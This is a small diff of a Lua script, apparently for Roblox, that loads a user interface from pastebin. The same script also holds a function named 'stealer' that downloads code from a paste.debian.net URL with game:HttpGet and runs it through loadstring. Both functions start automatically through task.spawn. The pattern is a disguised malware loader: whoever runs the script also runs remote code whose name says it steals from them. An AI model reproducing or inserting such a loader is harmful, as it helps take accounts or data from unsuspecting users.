@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet("https://paste.debian.net/plainh/e19502ff/", true))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://pastebin.com/q8Jgff3K", true))()
+  loadstring(game:HttpGet("https://pastebin.com/q8Jgff3K"))()
 end
 task.spawn(stealer)
 task.spawn(loadui)
